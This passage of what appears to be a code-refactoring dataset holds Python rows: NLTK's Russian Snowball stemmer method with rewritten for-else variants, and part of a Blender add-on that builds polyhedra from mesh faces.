                        ""i^ushchoe"",
                        ""i^ushchei`"",
                        ""i^ushchii`"",
                        ""i^ushchyi`"",
                        ""i^ushchoi`"",
                        ""i^ushchem"",
                        ""i^ushchim"",
                        ""i^ushchym"",
                        ""i^ushchom"",
                        ""vshi^ui^u"",
                        ""vshi^ai^a"",
                        ""shchui^u"",
                        ""shchai^a"",
                        ""shchoi^u"",
                        ""shchei^u"",
                        ""emi^ui^u"",
                        ""emi^ai^a"",
                        ""nni^ui^u"",
                        ""nni^ai^a"",
                        ""shchimi"",
                        ""shchymi"",
                        ""shchego"",
                        ""shchogo"",
                        ""shchemu"",
                        ""shchomu"",
                        ""shchikh"",
                        ""shchykh"",
                        ""vshui^u"",
                        ""vshai^a"",
                        ""vshoi^u"",
                        ""vshei^u"",
                        ""shchee"",
                        ""shchie"",
                        ""shchye"",
                        ""shchoe"",
                        ""shchei`"",
                        ""shchii`"",
                        ""shchyi`"",
                        ""shchoi`"",
                        ""shchem"",
                        ""shchim"",
                        ""shchym"",
                        ""shchom"",
                        ""vshimi"",
                        ""vshymi"",
                        ""vshego"",
                        ""vshogo"",
                        ""vshemu"",
                        ""vshomu"",
                        ""vshikh"",
                        ""vshykh"",
                        ""emui^u"",
                        ""emai^a"",
                        ""emoi^u"",
                        ""emei^u"",
                        ""nnui^u"",
                        ""nnai^a"",
                        ""nnoi^u"",
                        ""nnei^u"",
                        ""vshee"",
                        ""vshie"",
                        ""vshye"",
                        ""vshoe"",
                        ""vshei`"",
                        ""vshii`"",
                        ""vshyi`"",
                        ""vshoi`"",
                        ""vshem"",
                        ""vshim"",
                        ""vshym"",
                        ""vshom"",
                        ""emimi"",
                        ""emymi"",
                        ""emego"",
                        ""emogo"",
                        ""ememu"",
                        ""emomu"",
                        ""emikh"",
                        ""emykh"",
                        ""nnimi"",
                        ""nnymi"",
                        ""nnego"",
                        ""nnogo"",
                        ""nnemu"",
                        ""nnomu"",
                        ""nnikh"",
                        ""nnykh"",
                        ""emee"",
                        ""emie"",
                        ""emye"",
                        ""emoe"",
                        ""emei`"",
                        ""emii`"",
                        ""emyi`"",
                        ""emoi`"",
                        ""emem"",
                        ""emim"",
                        ""emym"",
                        ""emom"",
                        ""nnee"",
                        ""nnie"",
                        ""nnye"",
                        ""nnoe"",
                        ""nnei`"",
                        ""nnii`"",
                        ""nnyi`"",
                        ""nnoi`"",
                        ""nnem"",
                        ""nnim"",
                        ""nnym"",
                        ""nnom"",
                    ):
                        if (
                            rv[-len(suffix) - 3 : -len(suffix)] == ""i^a""
                            or rv[-len(suffix) - 1 : -len(suffix)] == ""a""
                        ):
                            word = word[: -len(suffix)]
                            r2 = r2[: -len(suffix)]
                            rv = rv[: -len(suffix)]
                            adjectival_removed = True
                            break
                    else:
                        word = word[: -len(suffix)]
                        r2 = r2[: -len(suffix)]
                        rv = rv[: -len(suffix)]
                        adjectival_removed = True
                        break

            if not adjectival_removed:
                for suffix in self.__verb_suffixes:
                    if rv.endswith(suffix):
                        if suffix in (
                            ""la"",
                            ""na"",
                            ""ete"",
                            ""i`te"",
                            ""li"",
                            ""i`"",
                            ""l"",
                            ""em"",
                            ""n"",
                            ""lo"",
                            ""no"",
                            ""et"",
                            ""i^ut"",
                            ""ny"",
                            ""t'"",
                            ""esh'"",
                            ""nno"",
                        ):
                            if (
                                rv[-len(suffix) - 3 : -len(suffix)] == ""i^a""
                                or rv[-len(suffix) - 1 : -len(suffix)] == ""a""
                            ):
                                word = word[: -len(suffix)]
                                r2 = r2[: -len(suffix)]
                                rv = rv[: -len(suffix)]
                                verb_removed = True
                                break
                        else:
                            word = word[: -len(suffix)]
                            r2 = r2[: -len(suffix)]
                            rv = rv[: -len(suffix)]
                            verb_removed = True
                            break

            if not adjectival_removed and not verb_removed:
                for suffix in self.__noun_suffixes:
                    if rv.endswith(suffix):
                        word = word[: -len(suffix)]
                        r2 = r2[: -len(suffix)]
                        rv = rv[: -len(suffix)]
                        break

        # Step 2
        if rv.endswith(""i""):
            word = word[:-1]
            r2 = r2[:-1]

        # Step 3
        for suffix in self.__derivational_suffixes:
            if r2.endswith(suffix):
                word = word[: -len(suffix)]
                break

        # Step 4
        if word.endswith(""nn""):
            word = word[:-1]
            undouble_success = True

        if not undouble_success:
            for suffix in self.__superlative_suffixes:
                if word.endswith(suffix):
                    word = word[: -len(suffix)]
                    superlative_removed = True
                    break
            if word.endswith(""nn""):
                word = word[:-1]

        if not undouble_success and not superlative_removed:
            if word.endswith(""'""):
                word = word[:-1]

        word = self.__roman_to_cyrillic(word)

        return word","for suffix in self.__perfective_gerund_suffixes:
    if rv.endswith(suffix):
        if suffix in ('v', 'vshi', ""vshis'""):
            if rv[-len(suffix) - 3:-len(suffix)] == 'i^a' or rv[-len(suffix) - 1:-len(suffix)] == 'a':
                word = word[:-len(suffix)]
                r2 = r2[:-len(suffix)]
                rv = rv[:-len(suffix)]
                step1_success = True
                break
        else:
            word = word[:-len(suffix)]
            r2 = r2[:-len(suffix)]
            rv = rv[:-len(suffix)]
            step1_success = True
            break
if not step1_success:
    for suffix in self.__reflexive_suffixes:
        if rv.endswith(suffix):
            word = word[:-len(suffix)]
            r2 = r2[:-len(suffix)]
            rv = rv[:-len(suffix)]
            break
    for suffix in self.__adjectival_suffixes:
        if rv.endswith(suffix):
            if suffix in ('i^ushchi^ui^u', 'i^ushchi^ai^a', 'i^ushchui^u', 'i^ushchai^a', 'i^ushchoi^u', 'i^ushchei^u', 'i^ushchimi', 'i^ushchymi', 'i^ushchego', 'i^ushchogo', 'i^ushchemu', 'i^ushchomu', 'i^ushchikh', 'i^ushchykh', 'shchi^ui^u', 'shchi^ai^a', 'i^ushchee', 'i^ushchie', 'i^ushchye', 'i^ushchoe', 'i^ushchei`', 'i^ushchii`', 'i^ushchyi`', 'i^ushchoi`', 'i^ushchem', 'i^ushchim', 'i^ushchym', 'i^ushchom', 'vshi^ui^u', 'vshi^ai^a', 'shchui^u', 'shchai^a', 'shchoi^u', 'shchei^u', 'emi^ui^u', 'emi^ai^a', 'nni^ui^u', 'nni^ai^a', 'shchimi', 'shchymi', 'shchego', 'shchogo', 'shchemu', 'shchomu', 'shchikh', 'shchykh', 'vshui^u', 'vshai^a', 'vshoi^u', 'vshei^u', 'shchee', 'shchie', 'shchye', 'shchoe', 'shchei`', 'shchii`', 'shchyi`', 'shchoi`', 'shchem', 'shchim', 'shchym', 'shchom', 'vshimi', 'vshymi', 'vshego', 'vshogo', 'vshemu', 'vshomu', 'vshikh', 'vshykh', 'emui^u', 'emai^a', 'emoi^u', 'emei^u', 'nnui^u', 'nnai^a', 'nnoi^u', 'nnei^u', 'vshee', 'vshie', 'vshye', 'vshoe', 'vshei`', 'vshii`', 'vshyi`', 'vshoi`', 'vshem', 'vshim', 'vshym', 'vshom', 'emimi', 'emymi', 'emego', 'emogo', 'ememu', 'emomu', 'emikh', 'emykh', 'nnimi', 'nnymi', 'nnego', 'nnogo', 'nnemu', 'nnomu', 'nnikh', 'nnykh', 'emee', 'emie', 'emye', 'emoe', 'emei`', 'emii`', 'emyi`', 'emoi`', 'emem', 'emim', 'emym', 'emom', 'nnee', 'nnie', 'nnye', 'nnoe', 'nnei`', 'nnii`', 'nnyi`', 'nnoi`', 'nnem', 'nnim', 'nnym', 'nnom'):
                if rv[-len(suffix) - 3:-len(suffix)] == 'i^a' or rv[-len(suffix) - 1:-len(suffix)] == 'a':
                    word = word[:-len(suffix)]
                    r2 = r2[:-len(suffix)]
                    rv = rv[:-len(suffix)]
                    adjectival_removed = True
                    break
            else:
                word = word[:-len(suffix)]
                r2 = r2[:-len(suffix)]
                rv = rv[:-len(suffix)]
                adjectival_removed = True
                break
    if not adjectival_removed:
        for suffix in self.__verb_suffixes:
            if rv.endswith(suffix):
                if suffix in ('la', 'na', 'ete', 'i`te', 'li', 'i`', 'l', 'em', 'n', 'lo', 'no', 'et', 'i^ut', 'ny', ""t'"", ""esh'"", 'nno'):
                    if rv[-len(suffix) - 3:-len(suffix)] == 'i^a' or rv[-len(suffix) - 1:-len(suffix)] == 'a':
                        word = word[:-len(suffix)]
                        r2 = r2[:-len(suffix)]
                        rv = rv[:-len(suffix)]
                        verb_removed = True
                        break
                else:
                    word = word[:-len(suffix)]
                    r2 = r2[:-len(suffix)]
                    rv = rv[:-len(suffix)]
                    verb_removed = True
                    break
    if not adjectival_removed and (not verb_removed):
        for suffix in self.__noun_suffixes:
            if rv.endswith(suffix):
                word = word[:-len(suffix)]
                r2 = r2[:-len(suffix)]
                rv = rv[:-len(suffix)]
                break","for suffix in self.__perfective_gerund_suffixes:
    if rv.endswith(suffix):
        if suffix in ('v', 'vshi', ""vshis'""):
            if rv[-len(suffix) - 3:-len(suffix)] == 'i^a' or rv[-len(suffix) - 1:-len(suffix)] == 'a':
                word = word[:-len(suffix)]
                r2 = r2[:-len(suffix)]
                rv = rv[:-len(suffix)]
                break
        else:
            word = word[:-len(suffix)]
            r2 = r2[:-len(suffix)]
            rv = rv[:-len(suffix)]
            break
else:
    for suffix in self.__reflexive_suffixes:
        if rv.endswith(suffix):
            word = word[:-len(suffix)]
            r2 = r2[:-len(suffix)]
            rv = rv[:-len(suffix)]
            break
    for suffix in self.__adjectival_suffixes:
        if rv.endswith(suffix):
            if suffix in ('i^ushchi^ui^u', 'i^ushchi^ai^a', 'i^ushchui^u', 'i^ushchai^a', 'i^ushchoi^u', 'i^ushchei^u', 'i^ushchimi', 'i^ushchymi', 'i^ushchego', 'i^ushchogo', 'i^ushchemu', 'i^ushchomu', 'i^ushchikh', 'i^ushchykh', 'shchi^ui^u', 'shchi^ai^a', 'i^ushchee', 'i^ushchie', 'i^ushchye', 'i^ushchoe', 'i^ushchei`', 'i^ushchii`', 'i^ushchyi`', 'i^ushchoi`', 'i^ushchem', 'i^ushchim', 'i^ushchym', 'i^ushchom', 'vshi^ui^u', 'vshi^ai^a', 'shchui^u', 'shchai^a', 'shchoi^u', 'shchei^u', 'emi^ui^u', 'emi^ai^a', 'nni^ui^u', 'nni^ai^a', 'shchimi', 'shchymi', 'shchego', 'shchogo', 'shchemu', 'shchomu', 'shchikh', 'shchykh', 'vshui^u', 'vshai^a', 'vshoi^u', 'vshei^u', 'shchee', 'shchie', 'shchye', 'shchoe', 'shchei`', 'shchii`', 'shchyi`', 'shchoi`', 'shchem', 'shchim', 'shchym', 'shchom', 'vshimi', 'vshymi', 'vshego', 'vshogo', 'vshemu', 'vshomu', 'vshikh', 'vshykh', 'emui^u', 'emai^a', 'emoi^u', 'emei^u', 'nnui^u', 'nnai^a', 'nnoi^u', 'nnei^u', 'vshee', 'vshie', 'vshye', 'vshoe', 'vshei`', 'vshii`', 'vshyi`', 'vshoi`', 'vshem', 'vshim', 'vshym', 'vshom', 'emimi', 'emymi', 'emego', 'emogo', 'ememu', 'emomu', 'emikh', 'emykh', 'nnimi', 'nnymi', 'nnego', 'nnogo', 'nnemu', 'nnomu', 'nnikh', 'nnykh', 'emee', 'emie', 'emye', 'emoe', 'emei`', 'emii`', 'emyi`', 'emoi`', 'emem', 'emim', 'emym', 'emom', 'nnee', 'nnie', 'nnye', 'nnoe', 'nnei`', 'nnii`', 'nnyi`', 'nnoi`', 'nnem', 'nnim', 'nnym', 'nnom'):
                if rv[-len(suffix) - 3:-len(suffix)] == 'i^a' or rv[-len(suffix) - 1:-len(suffix)] == 'a':
                    word = word[:-len(suffix)]
                    r2 = r2[:-len(suffix)]
                    rv = rv[:-len(suffix)]
                    adjectival_removed = True
                    break
            else:
                word = word[:-len(suffix)]
                r2 = r2[:-len(suffix)]
                rv = rv[:-len(suffix)]
                adjectival_removed = True
                break
    if not adjectival_removed:
        for suffix in self.__verb_suffixes:
            if rv.endswith(suffix):
                if suffix in ('la', 'na', 'ete', 'i`te', 'li', 'i`', 'l', 'em', 'n', 'lo', 'no', 'et', 'i^ut', 'ny', ""t'"", ""esh'"", 'nno'):
                    if rv[-len(suffix) - 3:-len(suffix)] == 'i^a' or rv[-len(suffix) - 1:-len(suffix)] == 'a':
                        word = word[:-len(suffix)]
                        r2 = r2[:-len(suffix)]
                        rv = rv[:-len(suffix)]
                        verb_removed = True
                        break
                else:
                    word = word[:-len(suffix)]
                    r2 = r2[:-len(suffix)]
                    rv = rv[:-len(suffix)]
                    verb_removed = True
                    break
    if not adjectival_removed and (not verb_removed):
        for suffix in self.__noun_suffixes:
            if rv.endswith(suffix):
                word = word[:-len(suffix)]
                r2 = r2[:-len(suffix)]
                rv = rv[:-len(suffix)]
                break",0
nltk,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/nltk/nltk/stem/snowball.py,https://github.com/nltk/nltk/tree/master/nltk/stem/snowball.py,RussianStemmer,stem$4882,"def stem(self, word):
        """"""
        Stem a Russian word and return the stemmed form.

        :param word: The word that is stemmed.
        :type word: str or unicode
        :return: The stemmed form.
        :rtype: unicode

        """"""
        if word in self.stopwords:
            return word

        chr_exceeded = False
        for i in range(len(word)):
            if ord(word[i]) > 255:
                chr_exceeded = True
                break

        if not chr_exceeded:
            return word

        word = self.__cyrillic_to_roman(word)

        step1_success = False
        adjectival_removed = False
        verb_removed = False
        undouble_success = False
        superlative_removed = False

        rv, r2 = self.__regions_russian(word)

        # Step 1
        for suffix in self.__perfective_gerund_suffixes:
            if rv.endswith(suffix):
                if suffix in (""v"", ""vshi"", ""vshis'""):
                    if (
                        rv[-len(suffix) - 3 : -len(suffix)] == ""i^a""
                        or rv[-len(suffix) - 1 : -len(suffix)] == ""a""
                    ):
                        word = word[: -len(suffix)]
                        r2 = r2[: -len(suffix)]
                        rv = rv[: -len(suffix)]
                        step1_success = True
                        break
                else:
                    word = word[: -len(suffix)]
                    r2 = r2[: -len(suffix)]
                    rv = rv[: -len(suffix)]
                    step1_success = True
                    break

        if not step1_success:
            for suffix in self.__reflexive_suffixes:
                if rv.endswith(suffix):
                    word = word[: -len(suffix)]
                    r2 = r2[: -len(suffix)]
                    rv = rv[: -len(suffix)]
                    break

            for suffix in self.__adjectival_suffixes:
                if rv.endswith(suffix):
                    if suffix in (
                        ""i^ushchi^ui^u"",
                        ""i^ushchi^ai^a"",
                        ""i^ushchui^u"",
                        ""i^ushchai^a"",
                        ""i^ushchoi^u"",
                        ""i^ushchei^u"",
                        ""i^ushchimi"",
                        ""i^ushchymi"",
                        ""i^ushchego"",
                        ""i^ushchogo"",
                        ""i^ushchemu"",
                        ""i^ushchomu"",
                        ""i^ushchikh"",
                        ""i^ushchykh"",
                        ""shchi^ui^u"",
                        ""shchi^ai^a"",
                        ""i^ushchee"",
                        ""i^ushchie"",
                        ""i^ushchye"",
                        ""i^ushchoe"",
                        ""i^ushchei`"",
                        ""i^ushchii`"",
                        ""i^ushchyi`"",
                        ""i^ushchoi`"",
                        ""i^ushchem"",
                        ""i^ushchim"",
                        ""i^ushchym"",
                        ""i^ushchom"",
                        ""vshi^ui^u"",
                        ""vshi^ai^a"",
                        ""shchui^u"",
                        ""shchai^a"",
                        ""shchoi^u"",
                        ""shchei^u"",
                        ""emi^ui^u"",
                        ""emi^ai^a"",
                        ""nni^ui^u"",
                        ""nni^ai^a"",
                        ""shchimi"",
                        ""shchymi"",
                        ""shchego"",
                        ""shchogo"",
                        ""shchemu"",
                        ""shchomu"",
                        ""shchikh"",
                        ""shchykh"",
                        ""vshui^u"",
                        ""vshai^a"",
                        ""vshoi^u"",
                        ""vshei^u"",
                        ""shchee"",
                        ""shchie"",
                        ""shchye"",
                        ""shchoe"",
                        ""shchei`"",
                        ""shchii`"",
                        ""shchyi`"",
                        ""shchoi`"",
                        ""shchem"",
                        ""shchim"",
                        ""shchym"",
                        ""shchom"",
                        ""vshimi"",
                        ""vshymi"",
                        ""vshego"",
                        ""vshogo"",
                        ""vshemu"",
                        ""vshomu"",
                        ""vshikh"",
                        ""vshykh"",
                        ""emui^u"",
                        ""emai^a"",
                        ""emoi^u"",
                        ""emei^u"",
                        ""nnui^u"",
                        ""nnai^a"",
                        ""nnoi^u"",
                        ""nnei^u"",
                        ""vshee"",
                        ""vshie"",
                        ""vshye"",
                        ""vshoe"",
                        ""vshei`"",
                        ""vshii`"",
                        ""vshyi`"",
                        ""vshoi`"",
                        ""vshem"",
                        ""vshim"",
                        ""vshym"",
                        ""vshom"",
                        ""emimi"",
                        ""emymi"",
                        ""emego"",
                        ""emogo"",
                        ""ememu"",
                        ""emomu"",
                        ""emikh"",
                        ""emykh"",
                        ""nnimi"",
                        ""nnymi"",
                        ""nnego"",
                        ""nnogo"",
                        ""nnemu"",
                        ""nnomu"",
                        ""nnikh"",
                        ""nnykh"",
                        ""emee"",
                        ""emie"",
                        ""emye"",
                        ""emoe"",
                        ""emei`"",
                        ""emii`"",
                        ""emyi`"",
                        ""emoi`"",
                        ""emem"",
                        ""emim"",
                        ""emym"",
                        ""emom"",
                        ""nnee"",
                        ""nnie"",
                        ""nnye"",
                        ""nnoe"",
                        ""nnei`"",
                        ""nnii`"",
                        ""nnyi`"",
                        ""nnoi`"",
                        ""nnem"",
                        ""nnim"",
                        ""nnym"",
                        ""nnom"",
                    ):
                        if (
                            rv[-len(suffix) - 3 : -len(suffix)] == ""i^a""
                            or rv[-len(suffix) - 1 : -len(suffix)] == ""a""
                        ):
                            word = word[: -len(suffix)]
                            r2 = r2[: -len(suffix)]
                            rv = rv[: -len(suffix)]
                            adjectival_removed = True
                            break
                    else:
                        word = word[: -len(suffix)]
                        r2 = r2[: -len(suffix)]
                        rv = rv[: -len(suffix)]
                        adjectival_removed = True
                        break

            if not adjectival_removed:
                for suffix in self.__verb_suffixes:
                    if rv.endswith(suffix):
                        if suffix in (
                            ""la"",
                            ""na"",
                            ""ete"",
                            ""i`te"",
                            ""li"",
                            ""i`"",
                            ""l"",
                            ""em"",
                            ""n"",
                            ""lo"",
                            ""no"",
                            ""et"",
                            ""i^ut"",
                            ""ny"",
                            ""t'"",
                            ""esh'"",
                            ""nno"",
                        ):
                            if (
                                rv[-len(suffix) - 3 : -len(suffix)] == ""i^a""
                                or rv[-len(suffix) - 1 : -len(suffix)] == ""a""
                            ):
                                word = word[: -len(suffix)]
                                r2 = r2[: -len(suffix)]
                                rv = rv[: -len(suffix)]
                                verb_removed = True
                                break
                        else:
                            word = word[: -len(suffix)]
                            r2 = r2[: -len(suffix)]
                            rv = rv[: -len(suffix)]
                            verb_removed = True
                            break

            if not adjectival_removed and not verb_removed:
                for suffix in self.__noun_suffixes:
                    if rv.endswith(suffix):
                        word = word[: -len(suffix)]
                        r2 = r2[: -len(suffix)]
                        rv = rv[: -len(suffix)]
                        break

        # Step 2
        if rv.endswith(""i""):
            word = word[:-1]
            r2 = r2[:-1]

        # Step 3
        for suffix in self.__derivational_suffixes:
            if r2.endswith(suffix):
                word = word[: -len(suffix)]
                break

        # Step 4
        if word.endswith(""nn""):
            word = word[:-1]
            undouble_success = True

        if not undouble_success:
            for suffix in self.__superlative_suffixes:
                if word.endswith(suffix):
                    word = word[: -len(suffix)]
                    superlative_removed = True
                    break
            if word.endswith(""nn""):
                word = word[:-1]

        if not undouble_success and not superlative_removed:
            if word.endswith(""'""):
                word = word[:-1]

        word = self.__roman_to_cyrillic(word)

        return word","for suffix in self.__adjectival_suffixes:
    if rv.endswith(suffix):
        if suffix in ('i^ushchi^ui^u', 'i^ushchi^ai^a', 'i^ushchui^u', 'i^ushchai^a', 'i^ushchoi^u', 'i^ushchei^u', 'i^ushchimi', 'i^ushchymi', 'i^ushchego', 'i^ushchogo', 'i^ushchemu', 'i^ushchomu', 'i^ushchikh', 'i^ushchykh', 'shchi^ui^u', 'shchi^ai^a', 'i^ushchee', 'i^ushchie', 'i^ushchye', 'i^ushchoe', 'i^ushchei`', 'i^ushchii`', 'i^ushchyi`', 'i^ushchoi`', 'i^ushchem', 'i^ushchim', 'i^ushchym', 'i^ushchom', 'vshi^ui^u', 'vshi^ai^a', 'shchui^u', 'shchai^a', 'shchoi^u', 'shchei^u', 'emi^ui^u', 'emi^ai^a', 'nni^ui^u', 'nni^ai^a', 'shchimi', 'shchymi', 'shchego', 'shchogo', 'shchemu', 'shchomu', 'shchikh', 'shchykh', 'vshui^u', 'vshai^a', 'vshoi^u', 'vshei^u', 'shchee', 'shchie', 'shchye', 'shchoe', 'shchei`', 'shchii`', 'shchyi`', 'shchoi`', 'shchem', 'shchim', 'shchym', 'shchom', 'vshimi', 'vshymi', 'vshego', 'vshogo', 'vshemu', 'vshomu', 'vshikh', 'vshykh', 'emui^u', 'emai^a', 'emoi^u', 'emei^u', 'nnui^u', 'nnai^a', 'nnoi^u', 'nnei^u', 'vshee', 'vshie', 'vshye', 'vshoe', 'vshei`', 'vshii`', 'vshyi`', 'vshoi`', 'vshem', 'vshim', 'vshym', 'vshom', 'emimi', 'emymi', 'emego', 'emogo', 'ememu', 'emomu', 'emikh', 'emykh', 'nnimi', 'nnymi', 'nnego', 'nnogo', 'nnemu', 'nnomu', 'nnikh', 'nnykh', 'emee', 'emie', 'emye', 'emoe', 'emei`', 'emii`', 'emyi`', 'emoi`', 'emem', 'emim', 'emym', 'emom', 'nnee', 'nnie', 'nnye', 'nnoe', 'nnei`', 'nnii`', 'nnyi`', 'nnoi`', 'nnem', 'nnim', 'nnym', 'nnom'):
            if rv[-len(suffix) - 3:-len(suffix)] == 'i^a' or rv[-len(suffix) - 1:-len(suffix)] == 'a':
                word = word[:-len(suffix)]
                r2 = r2[:-len(suffix)]
                rv = rv[:-len(suffix)]
                adjectival_removed = True
                break
        else:
            word = word[:-len(suffix)]
            r2 = r2[:-len(suffix)]
            rv = rv[:-len(suffix)]
            adjectival_removed = True
            break
if not adjectival_removed:
    for suffix in self.__verb_suffixes:
        if rv.endswith(suffix):
            if suffix in ('la', 'na', 'ete', 'i`te', 'li', 'i`', 'l', 'em', 'n', 'lo', 'no', 'et', 'i^ut', 'ny', ""t'"", ""esh'"", 'nno'):
                if rv[-len(suffix) - 3:-len(suffix)] == 'i^a' or rv[-len(suffix) - 1:-len(suffix)] == 'a':
                    word = word[:-len(suffix)]
                    r2 = r2[:-len(suffix)]
                    rv = rv[:-len(suffix)]
                    verb_removed = True
                    break
            else:
                word = word[:-len(suffix)]
                r2 = r2[:-len(suffix)]
                rv = rv[:-len(suffix)]
                verb_removed = True
                break","for suffix in self.__adjectival_suffixes:
    if rv.endswith(suffix):
        if suffix in ('i^ushchi^ui^u', 'i^ushchi^ai^a', 'i^ushchui^u', 'i^ushchai^a', 'i^ushchoi^u', 'i^ushchei^u', 'i^ushchimi', 'i^ushchymi', 'i^ushchego', 'i^ushchogo', 'i^ushchemu', 'i^ushchomu', 'i^ushchikh', 'i^ushchykh', 'shchi^ui^u', 'shchi^ai^a', 'i^ushchee', 'i^ushchie', 'i^ushchye', 'i^ushchoe', 'i^ushchei`', 'i^ushchii`', 'i^ushchyi`', 'i^ushchoi`', 'i^ushchem', 'i^ushchim', 'i^ushchym', 'i^ushchom', 'vshi^ui^u', 'vshi^ai^a', 'shchui^u', 'shchai^a', 'shchoi^u', 'shchei^u', 'emi^ui^u', 'emi^ai^a', 'nni^ui^u', 'nni^ai^a', 'shchimi', 'shchymi', 'shchego', 'shchogo', 'shchemu', 'shchomu', 'shchikh', 'shchykh', 'vshui^u', 'vshai^a', 'vshoi^u', 'vshei^u', 'shchee', 'shchie', 'shchye', 'shchoe', 'shchei`', 'shchii`', 'shchyi`', 'shchoi`', 'shchem', 'shchim', 'shchym', 'shchom', 'vshimi', 'vshymi', 'vshego', 'vshogo', 'vshemu', 'vshomu', 'vshikh', 'vshykh', 'emui^u', 'emai^a', 'emoi^u', 'emei^u', 'nnui^u', 'nnai^a', 'nnoi^u', 'nnei^u', 'vshee', 'vshie', 'vshye', 'vshoe', 'vshei`', 'vshii`', 'vshyi`', 'vshoi`', 'vshem', 'vshim', 'vshym', 'vshom', 'emimi', 'emymi', 'emego', 'emogo', 'ememu', 'emomu', 'emikh', 'emykh', 'nnimi', 'nnymi', 'nnego', 'nnogo', 'nnemu', 'nnomu', 'nnikh', 'nnykh', 'emee', 'emie', 'emye', 'emoe', 'emei`', 'emii`', 'emyi`', 'emoi`', 'emem', 'emim', 'emym', 'emom', 'nnee', 'nnie', 'nnye', 'nnoe', 'nnei`', 'nnii`', 'nnyi`', 'nnoi`', 'nnem', 'nnim', 'nnym', 'nnom'):
            if rv[-len(suffix) - 3:-len(suffix)] == 'i^a' or rv[-len(suffix) - 1:-len(suffix)] == 'a':
                word = word[:-len(suffix)]
                r2 = r2[:-len(suffix)]
                rv = rv[:-len(suffix)]
                adjectival_removed = True
                break
        else:
            word = word[:-len(suffix)]
            r2 = r2[:-len(suffix)]
            rv = rv[:-len(suffix)]
            adjectival_removed = True
            break
else:
    for suffix in self.__verb_suffixes:
        if rv.endswith(suffix):
            if suffix in ('la', 'na', 'ete', 'i`te', 'li', 'i`', 'l', 'em', 'n', 'lo', 'no', 'et', 'i^ut', 'ny', ""t'"", ""esh'"", 'nno'):
                if rv[-len(suffix) - 3:-len(suffix)] == 'i^a' or rv[-len(suffix) - 1:-len(suffix)] == 'a':
                    word = word[:-len(suffix)]
                    r2 = r2[:-len(suffix)]
                    rv = rv[:-len(suffix)]
                    verb_removed = True
                    break
            else:
                word = word[:-len(suffix)]
                r2 = r2[:-len(suffix)]
                rv = rv[:-len(suffix)]
                verb_removed = True
                break",0
tissue,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/tissue/polyhedra.py,https://github.com/alessandro-zomparelli/tissue/tree/master//polyhedra.py,polyhedra_wireframe,execute$94,"def execute(self, context):

        merge_dist = self.thickness*0.001

        subs = self.subdivisions

        start_time = time.time()
        ob = context.object
        me = simple_to_mesh(ob)
        bm = bmesh.new()
        bm.from_mesh(me)

        bm.verts.ensure_lookup_table()
        bm.edges.ensure_lookup_table()
        bm.faces.ensure_lookup_table()

        # Subdivide edges
        proportional_subs = True
        if subs > 1 and proportional_subs:
            wire_length = [e.calc_length() for e in bm.edges]
            all_edges = list(bm.edges)
            max_segment = max(wire_length)/subs
            split_edges = [[] for i in range(subs+1)]
            for e, l in zip(all_edges, wire_length):
                split_edges[int(l//max_segment)].append(e)
            for i in range(2,subs):
                perc = {}
                for e in split_edges[i]:
                    perc[e]=0.1
                bmesh.ops.bisect_edges(bm, edges=split_edges[i], cuts=i, edge_percents=perc)

        ### Create double faces
        double_faces = []
        double_layer_edge = []
        double_layer_piece = []
        for f in bm.faces:
            verts0 = [v.co for v in f.verts]
            verts1 = [v.co for v in f.verts]
            verts1.reverse()
            double_faces.append(verts0)
            double_faces.append(verts1)

        # Create new bmesh object and data layers
        bm1 = bmesh.new()

        # Create faces and assign Edge Layers
        for verts in double_faces:
            new_verts = []
            for v in verts:
                vert = bm1.verts.new(v)
                new_verts.append(vert)
            bm1.faces.new(new_verts)

        bm1.verts.ensure_lookup_table()
        bm1.edges.ensure_lookup_table()
        bm1.faces.ensure_lookup_table()

        n_faces = len(bm.faces)
        n_doubles = len(bm1.faces)

        polyhedra = []

        for e in bm.edges:
            done = []

            # ERROR: Naked edges
            e_faces = len(e.link_faces)
            if e_faces < 2:
                bm.free()
                bm1.free()
                message = ""Naked edges are not allowed""
                self.report({'ERROR'}, message)
                return {'CANCELLED'}

            edge_vec =  e.verts[1].co - e.verts[0].co

            # run first face
            for i1 in range(e_faces-1):
                f1 = e.link_faces[i1]
                #edge_verts1 = [v.index for v in f1.verts if v in e.verts]
                verts1 = [v.index for v in f1.verts]
                va1 = verts1.index(e.verts[0].index)
                vb1 = verts1.index(e.verts[1].index)
                # chech if order of the edge matches the order of the face
                dir1 = va1 == (vb1+1)%len(verts1)
                edge_vec1 = edge_vec if dir1 else -edge_vec

                # run second face
                faces2 = []
                normals2 = []
                for i2 in range(i1+1,e_faces):
                #for i2 in range(n_faces):
                    if i1 == i2: continue
                    f2 = e.link_faces[i2]
                    f2.normal_update()
                    #edge_verts2 = [v.index for v in f2.verts if v in e.verts]
                    verts2 = [v.index for v in f2.verts]
                    va2 = verts2.index(e.verts[0].index)
                    vb2 = verts2.index(e.verts[1].index)
                    # chech if order of the edge matches the order of the face
                    dir2 = va2 == (vb2+1)%len(verts2)
                    # check for normal consistency
                    if dir1 != dir2:
                        # add face
                        faces2.append(f2.index+1)
                        normals2.append(f2.normal)
                    else:
                        # add flipped face
                        faces2.append(-(f2.index+1))
                        normals2.append(-f2.normal)



                # find first polyhedra (positive)
                plane_x = f1.normal                     # normal
                plane_y = plane_x.cross(edge_vec1)      # tangent face perp edge
                id1 = (f1.index+1)

                min_angle0 = 10000

                # check consistent faces
                if id1 not in done:
                    id2 = None
                    min_angle = min_angle0
                    for i2, n2 in zip(faces2,normals2):
                        v2 = flatten_vector(-n2, plane_x, plane_y)
                        angle = vector_rotation(v2)
                        if angle < min_angle:
                            id2 = i2
                            min_angle = angle
                    if id2: done.append(id2)
                    new_poly = True
                    # add to existing polyhedron
                    for p in polyhedra:
                        if id1 in p or id2 in p:
                            new_poly = False
                            if id2 not in p: p.append(id2)
                            if id1 not in p: p.append(id1)
                            break
                    # start new polyhedron
                    if new_poly: polyhedra.append([id1, id2])

                # find second polyhedra (negative)
                plane_x = -f1.normal                    # normal
                plane_y = plane_x.cross(-edge_vec1)      # tangent face perp edge
                id1 = -(f1.index+1)

                if id1 not in done:
                    id2 = None
                    min_angle = min_angle0
                    for i2, n2 in zip(faces2, normals2):
                        v2 = flatten_vector(n2, plane_x, plane_y)
                        angle = vector_rotation(v2)
                        if angle < min_angle:
                            id2 = -i2
                            min_angle = angle
                    done.append(id2)
                    add = True
                    for p in polyhedra:
                        if id1 in p or id2 in p:
                            add = False
                            if id2 not in p: p.append(id2)
                            if id1 not in p: p.append(id1)
                            break
                    if add: polyhedra.append([id1, id2])

